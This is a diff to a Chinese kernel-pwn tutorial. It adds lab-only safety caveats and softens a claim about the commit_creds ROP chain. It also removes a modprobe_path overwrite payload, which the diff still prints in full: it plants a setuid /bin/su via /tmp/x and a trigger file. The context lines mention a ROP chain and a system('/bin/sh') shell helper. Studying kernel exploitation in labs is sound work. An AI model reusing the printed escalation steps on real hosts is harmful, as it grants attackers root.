@@ -1,5 +1,12 @@
 # 内核 Pwn (Kernel Pwn)
 
+## 实验与版本边界
+
+仅在无宿主共享目录/凭据的可撤回VM中研究。以下代码是不可编译的占位草图，
+包含未定义函数、0x0xxxxx偏移和架构相关汇编，不能作为工作exploit。
+slab对象大小、+22 trampoline偏移、CR4、KPTI、CFI和usercopy限制必须按准确构建核实。
+不能靠固定CR4常量或仅CPU标志推断可利用性。不要在真实宿主启动脆弱内核。
+
 ## 准备环境
 
 典型内核题包：
@@ -125,7 +132,7 @@ msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // 读回看是不是被改了 →
 
 ### 1. commit_creds(prepare_kernel_cred(0)) ROP
 
-经典且通用。前提：能控 RIP（栈溢出 / vtable 劫持）。
+历史性草图，不是通用链。现代内核可能拒绝 prepare_kernel_cred(NULL)；必须检查准确源码/配置。
 
 ```c
 // 用户态 ROP 链
@@ -176,25 +183,10 @@ void shell() { system("/bin/sh"); }
 适用：有任意写原语，但不一定能 ROP
 ```
 
-```c
-// 1. 准备 payload
-system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
-system("chmod +x /tmp/x");
+Do not modify `/bin/su` permissions or leave setuid artifacts. Study the helper path
+only in a disposable VM with synthetic data and restore its snapshot afterward.
+This guide does not provide a persistent host-modification payload.
 
-// 2. 准备触发文件
-system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
-system("chmod +x /tmp/trigger");
-
-// 3. 漏洞写：把 modprobe_path 改成 "/tmp/x\x00"
-arbitrary_write(modprobe_path_addr, "/tmp/x\x00");
-
-// 4. 触发
-system("/tmp/trigger");
-// 内核 root 跑 /tmp/x，做了 chmod +s /bin/su
-
-// 5. 利用 setuid
-system("/bin/su");
-```
 
 **modprobe_path 地址来源**：vmlinux 里符号，或 /proc/kallsyms（如果 kptr_restrict=0）。
 
